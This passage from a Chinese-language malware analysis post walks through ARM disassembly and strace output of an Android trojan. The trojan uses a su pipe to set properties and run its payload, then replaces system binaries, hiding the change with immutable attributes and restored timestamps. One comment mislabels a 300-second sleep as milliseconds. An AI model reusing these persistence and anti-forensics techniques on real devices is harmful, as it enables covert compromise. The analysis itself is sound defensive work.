<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000A38 loc_A38                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+F8↑j</span><br><span class="line">.text:00000A38                 ADD     R5, SP, #0x240+var_12C</span><br><span class="line">.text:00000A3A                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000A3C                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000A3E                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000A40                 BLX     memset</span><br><span class="line">.text:00000A44                 LDR     R3, =(CMD_SET_PROP_ptr - 0x10C8)</span><br><span class="line">.text:00000A46                 LDR     R1, =(aSSS - 0xA52) ; &quot;%s %s %s\n&quot;</span><br><span class="line">.text:00000A48                 MOV     R2, R11</span><br><span class="line">.text:00000A4A                 LDR     R3, [R4,R3]     ; CMD_SET_PROP</span><br><span class="line">.text:00000A4C                 MOV     R8, R1</span><br><span class="line">.text:00000A4E                 ADD     R8, PC          ; &quot;%s %s %s\n&quot;</span><br><span class="line">.text:00000A50                 STR     R3, [SP,#0x240+var_234]  ;字符串&quot;/system/bin/setprop&quot;</span><br><span class="line">.text:00000A52                 LDR     R3, =(PROP_RUNNING_ID_ptr - 0x10C8)</span><br><span class="line">.text:00000A54                 MOV     R1, R8          ; format格式化字符串</span><br><span class="line">.text:00000A56                 STR     R2, [SP,#0x240+var_240]</span><br><span class="line">.text:00000A58                 LDR     R3, [R4,R3]     ; PROP_RUNNING_ID (r0.bot.id)</span><br><span class="line">.text:00000A5A                 LDR     R2, [SP,#0x240+var_234]</span><br><span class="line">.text:00000A5C                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000A5E                 BLX     sprintf</span><br><span class="line">.text:00000A62                 MOVS    R0, R5          ; char * &quot;/system/bin/setprop ro.bot.idandroid_id\n&quot;</span><br><span class="line">.text:00000A64                 BLX     strlen          ; 计算组合后的字符串长度</span><br><span class="line">.text:00000A68                 MOVS    R3, R7          ; s 管道fd</span><br><span class="line">.text:00000A6A                 MOVS    R2, R0          ; n 要写入的字节长度</span><br><span class="line">.text:00000A6C                 MOVS    R1, #1          ; size 按字节计算</span><br><span class="line">.text:00000A6E                 MOVS    R0, R5          ; ptr  要写入的命令&quot;/system/bin/setprop ro.bot.idandroid_id\n&quot;</span><br><span class="line">.text:00000A70                 BLX     fwrite          ; 写入命令到管道</span><br><span class="line">.text:00000A74                 MOVS    R0, R7          ; stream 管道fd</span><br><span class="line">.text:00000A76                 BLX     fflush          ; 强制刷新</span><br><span class="line">.text:00000A7A                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000A7C                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000A7E                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000A80                 BLX     memset</span><br><span class="line">.text:00000A84                 LDR     R3, =(PROP_RUNNING_CH_ptr - 0x10C8) </span><br><span class="line">.text:00000A86                 MOV     R1, R10</span><br><span class="line">.text:00000A88                 LDR     R2, [SP,#0x240+var_234]</span><br><span class="line">.text:00000A8A                 LDR     R3, [R4,R3]     ; PROP_RUNNING_CH</span><br><span class="line">.text:00000A8C                 STR     R1, [SP,#0x240+var_240] ; ‘NCutterope’压入堆栈</span><br><span class="line">.text:00000A8E                 MOVS    R0, R5          ; s        </span><br><span class="line">.text:00000A90                 MOV     R1, R8          ; format</span><br><span class="line">.text:00000A92                 BLX     sprintf</span><br><span class="line">.text:00000A96                 MOVS    R0, R5          ; char * &quot;/system/bin/setprop ro.bot.ch NCutterope\n&quot;</span><br><span class="line">.text:00000A98                 BLX     strlen</span><br><span class="line">.text:00000A9C                 MOVS    R3, R7          ; s</span><br><span class="line">.text:00000A9E                 MOVS    R2, R0          ; n</span><br><span class="line">.text:00000AA0                 MOVS    R1, #1          ; size</span><br><span class="line">.text:00000AA2                 MOVS    R0, R5          ; ptr</span><br><span class="line">.text:00000AA4                 BLX     fwrite</span><br><span class="line">.text:00000AA8                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000AAA                 BLX     fflush</span><br><span class="line">.text:00000AAE                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000AB0                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000AB2                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000AB4                 BLX     memset</span><br><span class="line">.text:00000AB8                 LDR     R1, =(aS - 0xAC2) ; &quot;%s\n&quot;</span><br><span class="line">.text:00000ABA                 MOVS    R2, R6          ; 生成的恶意文件名</span><br><span class="line">.text:00000ABC                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000ABE                 ADD     R1, PC          ; &quot;%s\n&quot;</span><br><span class="line">.text:00000AC0                 BLX     sprintf</span><br><span class="line">.text:00000AC4                 MOVS    R0, R5          ; char *</span><br><span class="line">.text:00000AC6                 BLX     strlen</span><br><span class="line">.text:00000ACA                 MOVS    R3, R7          ; s</span><br><span class="line">.text:00000ACC                 MOVS    R2, R0          ; n</span><br><span class="line">.text:00000ACE                 MOVS    R1, #1          ; size</span><br><span class="line">.text:00000AD0                 MOVS    R0, R5          ; ptr</span><br><span class="line">.text:00000AD2                 BLX     fwrite          ; 执行恶意文件</span><br><span class="line">.text:00000AD6                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000AD8                 BLX     fflush</span><br><span class="line">.text:00000ADC                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000ADE                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000AE0                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000AE2                 BLX     memset</span><br><span class="line">.text:00000AE6                 LDR     R3, =0x74697865</span><br><span class="line">.text:00000AE8                 MOVS    R0, R5          ; char *</span><br><span class="line">.text:00000AEA                 STR     R3, [SP,#0x240+var_12C]</span><br><span class="line">.text:00000AEC                 MOVS    R3, #0xA</span><br><span class="line">.text:00000AEE                 STRH    R3, [R5,#4]</span><br><span class="line">.text:00000AF0                 BLX     strlen</span><br><span class="line">.text:00000AF4                 MOVS    R1, #1          ; size</span><br><span class="line">.text:00000AF6                 MOVS    R2, R0          ; n</span><br><span class="line">.text:00000AF8                 MOVS    R3, R7          ; s</span><br><span class="line">.text:00000AFA                 MOVS    R0, R5          ; ptr</span><br><span class="line">.text:00000AFC                 BLX     fwrite</span><br><span class="line">.text:00000B00                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000B02                 BLX     fflush</span><br><span class="line">.text:00000B06                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000B08                 BLX     pclose</span><br><span class="line">.text:00000B0C                 MOVS    R0, #0x12C      ; seconds</span><br><span class="line">.text:00000B10                 BLX     sleep           ; 休眠300毫秒</span><br><span class="line">.text:00000B14                 MOVS    R0, R6          ; name</span><br><span class="line">.text:00000B16                 BLX     unlink          : 删除文件</span><br><span class="line">.text:00000B1A                 MOVS    R0, #1</span><br></pre></td></tr></table></figure>

<p>整个代码一共往su管道写入了4次命令。第一次是”&#x2F;system&#x2F;bin&#x2F;setprop ro.bot.idandroid_id\n”；第二次是”&#x2F;system&#x2F;bin&#x2F;setprop ro.bot.ch NCutterope\n”；第三次是执行病毒主体文件；第四次是调用sleep()函数睡眠300毫秒，最后调用unlink()函数删除文件。</p>
<p>在执行上述操作后，系统将还原寄存器的初始值，将压入堆栈中的寄存器值取出进行恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> loc_B1C                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+5A↑j</span><br><span class="line">.text:00000B1C                                         ; Java_com_airpuh_ad_UpdateCheck_DataInit+206↓j</span><br><span class="line">.text:00000B1C                 MOV     R2, R9</span><br><span class="line">.text:00000B1E                 LDR     R3, [R4,R2]     ; __stack_chk_guard</span><br><span class="line">.text:00000B20                 LDR     R2, [SP,#0x240+var_2C]</span><br><span class="line">.text:00000B22                 LDR     R3, [R3]</span><br><span class="line">.text:00000B24                 CMP     R2, R3</span><br><span class="line">.text:00000B26                 BNE     loc_B5C</span><br><span class="line">.text:00000B28                 MOVS    R3, #0x21C</span><br><span class="line">.text:00000B2C                 ADD     SP, R3</span><br><span class="line">.text:00000B2E                 POP     &#123;R2-R5&#125;</span><br><span class="line">.text:00000B30                 MOV     R8, R2</span><br><span class="line">.text:00000B32                 MOV     R9, R3</span><br><span class="line">.text:00000B34                 MOV     R10, R4</span><br><span class="line">.text:00000B36                 MOV     R11, R5</span><br><span class="line">.text:00000B38                 POP     &#123;R4-R7,PC&#125;</span><br></pre></td></tr></table></figure>

<p>在静态分析原生程序时，为了不影响函数调用时的中间结果，在使用前需要对函数中涉及到的通用寄存器进行现场保护。</p>
<h3 id="Native层病毒核心分析"><a href="#Native层病毒核心分析" class="headerlink" title="Native层病毒核心分析"></a>Native层病毒核心分析</h3><p>我们使用上面提取出来的病毒主体在测试环境下运行并使用strace获取其调用的所有系统API函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push evil.bin /data/local/tmp</span><br><span class="line">chmod 777 /data/local/tmp/evil.bin</span><br><span class="line">strace evil.bin &gt; evil.strace</span><br></pre></td></tr></table></figure>

<p>下面是从evil.strace文件中提取出的一段内容，这里是将&#x2F;system&#x2F;bin&#x2F;debuggerd文件复制一份保存到&#x2F;system&#x2F;framework&#x2F;debuggerd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">access(&quot;/system/framework/debuggerd&quot;, F_OK) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/system/bin/debuggerd&quot;, O_RDONLY|O_LARGEFILE) = 3</span><br><span class="line">open(&quot;/system/framework/debuggerd&quot;, O_RDWR|O_CREAT|O_TRUNC|O_LARGEFILE, 0600) = 4</span><br><span class="line">read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0(\0\1\0\0\0°\221\0\000&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0(\0\1\0\0\0°\221\0\000&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;dñ¼å\0Æ\217â\3Ê\214â\\ñ¼å\0Æ\217â\3Ê\214âTñ¼å\0Æ\217â&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;dñ¼å\0Æ\217â\3Ê\214â\\ñ¼å\0Æ\217â\3Ê\214âTñ¼å\0Æ\217â&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;\2Ð\177JzD\33à\200# \34\4!\32\1þ÷þï\36%#®)àþ÷Xï\1h&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;\2Ð\177JzD\33à\200# \34\4!\32\1þ÷þï\36%#®)àþ÷Xï\1h&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;\222è\4\36\4Úý÷bï\1h\4)óÐ \34ø½\0\22\0\0ðµ\211°\1\220\f&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;\222è\4\36\4Úý÷bï\1h\4)óÐ \34ø½\0\22\0\0ðµ\211°\1\220\f&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0&quot;..., 4096) = 1716</span><br><span class="line">write(4, &quot;ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0&quot;..., 1716) = 1716</span><br><span class="line">read(3, &quot;&quot;, 4096)                       = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">close(4)                                = 0</span><br><span class="line">sync()                                  = 0</span><br><span class="line">sync()                                  = 0</span><br><span class="line">chmod(&quot;/system/framework/debuggerd&quot;, 0755) = 0</span><br></pre></td></tr></table></figure>

<p>使用IDA打开保存的病毒主体，下面是<strong>设置感染标志</strong>的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000CAF0 loc_CAF0                                ; CODE XREF: main_0+3A↑j</span><br><span class="line">.text:0000CAF0                 LDR     R5, =(PROP_RUNNING_FLAG_ptr - 0xECB8)</span><br><span class="line">.text:0000CAF2                 LDR     R1, =0x44C</span><br><span class="line">.text:0000CAF4                 MOVS    R2, #0x7F</span><br><span class="line">.text:0000CAF6                 LDR     R0, [R6,R5]     ; PROP_RUNNING_FLAG ro.bot.run</span><br><span class="line">.text:0000CAF8                 ADD     R1, SP</span><br><span class="line">.text:0000CAFA                 STR     R1, [SP,#0x4F8+var_488] ; int</span><br><span class="line">.text:0000CAFC                 BL      sub_A76C</span><br><span class="line">.text:0000CB00                 CMP     R0, #0          ; ro.bot.run记录系统是否已经感染了木马</span><br><span class="line">.text:0000CB02                 BEQ     sub_CB16        ; </span><br><span class="line">.text:0000CB04                 LDRB    R3, [R0]        ; int</span><br><span class="line">.text:0000CB06                 CMP     R3, #0x30 ; &#x27;0&#x27;</span><br><span class="line">.text:0000CB08                 BNE     loc_CB0E      </span><br><span class="line">.text:0000CB0A                 BL      sub_D47E</span><br><span class="line">.text:0000CB0E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000CB0E</span><br><span class="line">.text:0000CB0E loc_CB0E                                ; CODE XREF: main_0+58↑j</span><br><span class="line">.text:0000CB0E                 CMP     R3, #0x31 ; &#x27;1&#x27;</span><br><span class="line">.text:0000CB10                 BNE     sub_CB16        ; setprop_r0.bot.run</span><br><span class="line">.text:0000CB12                 BL      sub_D450        ; getprop_r0.bot.val</span><br></pre></td></tr></table></figure>

<p>首先检查自己是以什么身份运行，即检测自己是否被感染。若感染即退出函数，否则就跳转到getprop_r0.bot.val读取属性r0.bot.val的值，使用当前时间减去这个差值，使用当前时间减去这个差值，判断是否大于3600.如果读取失败或者差值大于3600就跳到setprop_r0.bot.val标号处执行，相应代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000D450 sub_D450                                ; CODE XREF: main_0+62↑p</span><br><span class="line">.text:0000D450</span><br><span class="line">.text:0000D450 arg_70          =  0x70</span><br><span class="line">.text:0000D450</span><br><span class="line">.text:0000D450                 MOVS    R0, #0          ; timer</span><br><span class="line">.text:0000D452                 BLX     time            ; 获取当前时间</span><br><span class="line">.text:0000D456                 LDR     R3, =0x1CC</span><br><span class="line">.text:0000D458                 MOVS    R7, R0</span><br><span class="line">.text:0000D45A                 LDR     R1, [SP,#arg_70]</span><br><span class="line">.text:0000D45C                 LDR     R0, [R6,R3]</span><br><span class="line">.text:0000D45E                 MOVS    R2, #0x7F</span><br><span class="line">.text:0000D460                 BL      sub_A76C        ; 这个属性保存的是病毒发作时间</span><br><span class="line">.text:0000D464                 CMP     R0, #0</span><br><span class="line">.text:0000D466                 BNE     loc_D46C</span><br><span class="line">.text:0000D468                 BL      sub_CB16</span><br><span class="line"></span><br><span class="line">.text:0000D46C loc_D46C                                ; CODE XREF: sub_D450+16↑j</span><br><span class="line">.text:0000D46C                 BLX     atol</span><br><span class="line">.text:0000D470                 MOVS    R3, #0xE1</span><br><span class="line">.text:0000D472                 SUBS    R7, R7, R0      ; 使用当前时间值减去保存的时间值</span><br><span class="line">.text:0000D474                 LSLS    R3, R3, #4      ; int</span><br><span class="line">.text:0000D476                 CMP     R7, R3          ; 判断感染时间间隔3600秒</span><br><span class="line">.text:0000D478                 BLE     sub_D47E</span><br><span class="line">.text:0000D47A                 BL      sub_CB16</span><br></pre></td></tr></table></figure>

<p>我们来看下setprop_r0.bot.val标号处执行，即代码中的sub_CB16标记处。首先设置ro.bot.run的值为字符串”0”，然后开始感染系统文件，感染完成后再将其设置为字符串”1”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000CB16                 LDR     R5, [R6,R5]</span><br><span class="line">.text:0000CB18                 LDR     R1, =(a0 - 0xCB20) ; &quot;0&quot;</span><br><span class="line">.text:0000CB1A                 MOVS    R0, R5</span><br><span class="line">.text:0000CB1C                 ADD     R1, PC          ; &quot;0&quot;</span><br><span class="line">.text:0000CB1E                 BL      sub_A7D4</span><br><span class="line">.text:0000CB22                 BL      sub_BF6C        ; 感染系统文件</span><br><span class="line">.text:0000CB26                 BL      sub_C3F4</span><br><span class="line">.text:0000CB2A                 LDR     R1, =(a1 - 0xCB32) ; &quot;1&quot;</span><br><span class="line">.text:0000CB2C                 MOVS    R0, R5</span><br><span class="line">.text:0000CB2E                 ADD     R1, PC          ; &quot;1&quot;</span><br><span class="line">.text:0000CB30                 BL      sub_A7D4</span><br><span class="line">.text:0000CB34                 LDR     R3, =0x264</span><br><span class="line">.text:0000CB36                 LDR     R0, [R4]        ; dest</span><br><span class="line">.text:0000CB38                 LDR     R1, [R6,R3]     ; src</span><br><span class="line">.text:0000CB3A                 BLX     strcpy</span><br><span class="line">.text:0000CB3E                 BLX     fork</span><br><span class="line">.text:0000CB42                 CMP     R0, #0</span><br><span class="line">.text:0000CB44                 BEQ     loc_CB4A</span><br><span class="line">.text:0000CB46                 BL      sub_D47E</span><br></pre></td></tr></table></figure>

<p>下面为<strong>感染系统文件</strong>的具体代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000BDEE                 LDR     R3, [R3]</span><br><span class="line">.text:0000BDF0                 STR     R3, [SP,#0x248+var_2C]</span><br><span class="line">.text:0000BDF2                 BLX     open           ; 读取/system/bin/svc</span><br><span class="line">.text:0000BDF6                 SUBS    R7, R0, #0</span><br><span class="line">.text:0000BDF8                 BLT     loc_BECC</span><br><span class="line">.text:0000BDFA                 ADD     R6, SP, #0x248+buf</span><br><span class="line">.text:0000BDFC                 MOVS    R2, #0x80</span><br><span class="line">.text:0000BDFE                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:0000BE00                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE02                 LSLS    R2, R2, #2      ; nbytes</span><br><span class="line">.text:0000BE04                 BLX     read            ; 调用read()读取/system/bin/svc</span><br><span class="line">.text:0000BE08                 MOV     R11, R0         </span><br><span class="line">.text:0000BE0A                 CMP     R0, #0</span><br><span class="line">.text:0000BE0C                 BGT     loc_BE10</span><br><span class="line">.text:0000BE0E                 B       loc_BEEE</span><br><span class="line">.text:0000BE10 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000BE10</span><br><span class="line">.text:0000BE10 loc_BE10                                ; CODE XREF: sub_BDD0+3C↑j</span><br><span class="line">.text:0000BE10                 LDRB    R3, [R6]        ; 读取文件内容的第一个字符</span><br><span class="line">.text:0000BE12                 CMP     R3, #0x23 ; &#x27;#&#x27; ; 第一个字符是否为&#x27;#&#x27;</span><br><span class="line">.text:0000BE14                 BNE     loc_BE18</span><br><span class="line">.text:0000BE16                 B       loc_BF02        ; 为&#x27;#&#x27;则跳转</span><br><span class="line">.text:0000BE18 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000BE18</span><br><span class="line">.text:0000BE18 loc_BE18                                ; CODE XREF: sub_BDD0+44↑j</span><br><span class="line">.text:0000BE18                                         ; sub_BDD0+138↓j ...</span><br><span class="line">.text:0000BE18                 MOVS    R1, #0</span><br><span class="line">.text:0000BE1A                 STR     R6, [SP,#0x248+s1]</span><br><span class="line">.text:0000BE1C                 STR     R1, [SP,#0x248+n]</span><br><span class="line">.text:0000BE1E                 STR     R1, [SP,#0x248+var_23C]</span><br><span class="line">.text:0000BE20</span><br><span class="line">.text:0000BE20 loc_BE20                                ; CODE XREF: sub_BDD0+16E↓j</span><br><span class="line">.text:0000BE20                                         ; sub_BDD0+17C↓j</span><br><span class="line">.text:0000BE20                 LDR     R2, =(BOOT_MAGIC_ptr - 0xECB8)</span><br><span class="line">.text:0000BE22                 LDR     R5, [R4,R2]     ; BOOT_MAGIC /system/bin/ifconfig</span><br><span class="line">.text:0000BE24                 STR     R2, [SP,#0x248+var_244]</span><br><span class="line">.text:0000BE26                 MOVS    R0, R5          ; s</span><br><span class="line">.text:0000BE28                 BLX     strlen</span><br><span class="line">.text:0000BE2C                 MOVS    R1, R5          ; s2</span><br><span class="line">.text:0000BE2E                 MOVS    R2, R0          ; n</span><br><span class="line">.text:0000BE30                 LDR     R0, [SP,#0x248+s1] ; s1</span><br><span class="line">.text:0000BE32                 BLX     memcmp</span><br><span class="line">.text:0000BE36                 CMP     R0, #0</span><br><span class="line">.text:0000BE38                 BEQ     loc_BEEE</span><br><span class="line">.text:0000BE3A                 LDR     R3, =(BOOT_TEMP_FILE_ptr - 0xECB8)</span><br><span class="line">.text:0000BE3C                 LDR     R1, =0x242      ; oflag</span><br><span class="line">.text:0000BE3E                 LDR     R2, =0x1ED</span><br><span class="line">.text:0000BE40                 LDR     R0, [R4,R3]     ; BOOT_TEMP_FILE ; file /data/.bootemp</span><br><span class="line">.text:0000BE42                 STR     R3, [SP,#0x248+var_238]</span><br><span class="line">.text:0000BE44                 BLX     open</span><br><span class="line">.text:0000BE48                 MOV     R8, R0</span><br><span class="line">.text:0000BE4A                 CMP     R0, #0</span><br><span class="line">.text:0000BE4C                 BLT     loc_BEEE</span><br><span class="line">.text:0000BE4E                 LDR     R1, [SP,#0x248+var_23C]</span><br><span class="line">.text:0000BE50                 CMP     R1, #0</span><br><span class="line">.text:0000BE52                 BEQ     loc_BE5E</span><br><span class="line">.text:0000BE54                 MOV     R0, R8          ; fd</span><br><span class="line">.text:0000BE56                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE58                 LDR     R2, [SP,#0x248+n] ; n</span><br><span class="line">.text:0000BE5A                 BLX     write            ; 在/data/.bootemp文件第一行写入/system/bin/ifconfig</span><br><span class="line"></span><br><span class="line">.text:0000BE5E loc_BE5E                                ; CODE XREF: sub_BDD0+82↑j</span><br><span class="line">.text:0000BE5E                 LDR     R2, [SP,#0x248+var_244]</span><br><span class="line">.text:0000BE60                 LDR     R5, [R4,R2]</span><br><span class="line">.text:0000BE62                 MOVS    R0, R5          ; s</span><br><span class="line">.text:0000BE64                 BLX     strlen</span><br><span class="line">.text:0000BE68                 MOVS    R1, R5          ; buf</span><br><span class="line">.text:0000BE6A                 MOVS    R2, R0          ; n</span><br><span class="line">.text:0000BE6C                 MOV     R0, R8          ; fd</span><br><span class="line">.text:0000BE6E                 BLX     write</span><br><span class="line">.text:0000BE72                 LDR     R1, [SP,#0x248+var_23C]</span><br><span class="line">.text:0000BE74                 MOV     R3, R11</span><br><span class="line">.text:0000BE76                 MOV     R0, R8          ; fd</span><br><span class="line">.text:0000BE78                 SUBS    R2, R3, R1      ; n</span><br><span class="line">.text:0000BE7A                 LDR     R1, [SP,#0x248+s1] ; buf</span><br><span class="line">.text:0000BE7C                 BLX     write</span><br><span class="line">.text:0000BE80                 MOV     R5, R8</span><br><span class="line">.text:0000BE82                 MOV     R8, R4</span><br><span class="line">.text:0000BE84</span><br><span class="line">.text:0000BE84 loc_BE84                                ; CODE XREF: sub_BDD0+D0↓j</span><br><span class="line">.text:0000BE84                 MOVS    R2, #0x80</span><br><span class="line">.text:0000BE86                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:0000BE88                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE8A                 LSLS    R2, R2, #2      ; nbytes 每次读0x100字节</span><br><span class="line">.text:0000BE8C                 BLX     read</span><br><span class="line">.text:0000BE90                 SUBS    R4, R0, #0</span><br><span class="line">.text:0000BE92                 BLE     loc_BEA2</span><br><span class="line">.text:0000BE94                 MOVS    R0, R5          ; fd</span><br><span class="line">.text:0000BE96                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE98                 MOVS    R2, R4          ; n</span><br><span class="line">.text:0000BE9A                 BLX     write</span><br><span class="line">.text:0000BE9E                 CMP     R4, R0</span><br><span class="line">.text:0000BEA0                 BEQ     loc_BE84        ; 循环读写文件，复制动作</span><br><span class="line">.text:0000BEA2</span><br><span class="line">.text:0000BEA2 loc_BEA2                                ; CODE XREF: sub_BDD0+C2↑j</span><br><span class="line">.text:0000BEA2                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:0000BEA4                 BLX     close</span><br><span class="line">.text:0000BEA8                 MOVS    R0, R5          ; fd</span><br><span class="line">.text:0000BEAA                 BLX     close</span><br><span class="line">.text:0000BEAE                 BLX     sync</span><br><span class="line">.text:0000BEB2                 BLX     sync</span><br><span class="line">.text:0000BEB6                 LDR     R2, [SP,#0x248+var_238]</span><br><span class="line">.text:0000BEB8                 MOV     R4, R8</span><br><span class="line">.text:0000BEBA                 MOV     R1, R10</span><br><span class="line">.text:0000BEBC                 LDR     R5, [R4,R2]</span><br><span class="line">.text:0000BEBE                 MOVS    R2, #1</span><br><span class="line">.text:0000BEC0                 MOVS    R0, R5</span><br><span class="line">.text:0000BEC2                 BL      sub_BB9C        ; 感染/system/bin/svc文件</span><br><span class="line">.text:0000BEC6                 MOVS    R0, R5          ; name</span><br><span class="line">.text:0000BEC8                 BLX     unlink          ; 删除/data/.bootemp文件</span><br></pre></td></tr></table></figure>

<p>上面为svc文件的整个感染过程，这段代码主要的是在调用sub_bb9c，我们来看下他的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000BB9C sub_BB9C                                ; CODE XREF: sub_BC0C+15A↓p</span><br><span class="line">.text:0000BB9C                                         ; sub_BDD0+F2↓p ...</span><br><span class="line">.text:0000BB9C</span><br><span class="line">.text:0000BB9C var_18          = -0x18</span><br><span class="line">.text:0000BB9C var_14          = -0x14</span><br><span class="line">.text:0000BB9C</span><br><span class="line">.text:0000BB9C ; __unwind &#123;</span><br><span class="line">.text:0000BB9C                 PUSH    &#123;R4-R6,LR&#125;</span><br><span class="line">.text:0000BB9E                 SUB     SP, SP, #8</span><br><span class="line">.text:0000BBA0                 MOVS    R4, R1</span><br><span class="line">.text:0000BBA2                 MOVS    R6, R2</span><br><span class="line">.text:0000BBA4                 MOVS    R5, R0</span><br><span class="line">.text:0000BBA6                 BL      sub_AA38        ; 获取系统文件的最后一次改变时间   </span><br><span class="line">.text:0000BBAA                 STR     R0, [SP,#0x18+var_14]</span><br><span class="line">.text:0000BBAC                 MOVS    R0, #0</span><br><span class="line">.text:0000BBAE                 BL      sub_A820        ; 重新挂载系统分区为可读写</span><br><span class="line">.text:0000BBB2                 MOVS    R0, #0          ; timer</span><br><span class="line">.text:0000BBB4                 BLX     time</span><br><span class="line">.text:0000BBB8                 STR     R0, [SP,#0x18+var_18]</span><br><span class="line">.text:0000BBBA                 ADD     R0, SP, #0x18+var_14</span><br><span class="line">.text:0000BBBC                 BL      sub_BA84         ; 设置一下时间</span><br><span class="line">.text:0000BBC0                 MOVS    R0, R4</span><br><span class="line">.text:0000BBC2                 BL      sub_B5A8          ; 去掉系统属性</span><br><span class="line">.text:0000BBC6                 MOVS    R0, R4          ; name</span><br><span class="line">.text:0000BBC8                 BLX     unlink</span><br><span class="line">.text:0000BBCC                 BLX     sync</span><br><span class="line">.text:0000BBD0                 BLX     sync</span><br><span class="line">.text:0000BBD4                 CMP     R6, #0</span><br><span class="line">.text:0000BBD6                 BNE     loc_BC00</span><br><span class="line">.text:0000BBD8                 MOVS    R0, R5</span><br><span class="line">.text:0000BBDA                 MOVS    R1, R4</span><br><span class="line">.text:0000BBDC                 BL      sub_A934        ; 将/data/.bootemp的内容写入要感染的文件</span><br><span class="line"></span><br><span class="line">.text:0000BBE0                 MOVS    R1, #0xD2</span><br><span class="line">.text:0000BBE2                 MOVS    R0, R4          ; file</span><br><span class="line">.text:0000BBE4                 LSLS    R1, R1, #1      ; mode U644</span><br><span class="line">.text:0000BBE6                 BLX     chmod           ; 设置为大家可读写</span><br><span class="line">.text:0000BBEA</span><br><span class="line">.text:0000BBEA loc_BBEA                                ; CODE XREF: sub_BB9C+6C↓j</span><br><span class="line">.text:0000BBEA                 MOVS    R0, R4</span><br><span class="line">.text:0000BBEC                 BL      sub_B5DC        ; 加上系统属性</span><br><span class="line">.text:0000BBF0                 MOV     R0, SP</span><br><span class="line">.text:0000BBF2                 BL      sub_BA84        ; 再次设置时间，为了不改变被感染文件的最后访问时间</span><br><span class="line">.text:0000BBF6                 MOVS    R0, #1</span><br><span class="line">.text:0000BBF8                 BL      sub_A820         ; 重新挂载系统分区为只读</span><br><span class="line">.text:0000BBFC                 ADD     SP, SP, #8</span><br><span class="line">.text:0000BBFE                 POP     &#123;R4-R6,PC&#125;</span><br><span class="line">.text:0000BC00 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000BC00</span><br><span class="line">.text:0000BC00 loc_BC00                                ; CODE XREF: sub_BB9C+3A↑j</span><br><span class="line">.text:0000BC00                 MOVS    R0, R5</span><br><span class="line">.text:0000BC02                 MOVS    R1, R4</span><br><span class="line">.text:0000BC04                 BL      sub_A9E4        ; 拷贝文件并更改用户组ID</span><br><span class="line">.text:0000BC08                 B       loc_BBEA</span><br></pre></td></tr></table></figure>

<p>感染操作就是一个文件复制的过程，使得病毒主体文件来替换这些系统文件，感染过程大致分为4个部分：</p>
<ul>
<li>首先获取文件最后一次修改时间，以便后续病毒将自己最后的修改时间设置与他们相同，来达到隐藏自己不被发现的目的</li>
<li>重新挂载&#x2F;system目录为可读可写，默认情况下&#x2F;system目录是只读挂载的，去除被感染文件不可删除的属性</li>
<li>将&#x2F;data&#x2F;.bootemp的内容复制一份保存为要感染的文件，感染完成后调用chmod()修改其属性为644，接着调用addIattr()为文件添加不可删除属性，最后调用settime()设置文件最后修改时间、</li>
<li>重新恢复&#x2F;system目录为只读</li>
</ul>
<p>在感染系统完成后，病毒开始获取系统硬件信息，然后连接远程的服务器。发现病毒共有3个服务器地址以及s1.php、s2.php与s3.php共3个请求的文件：</p>
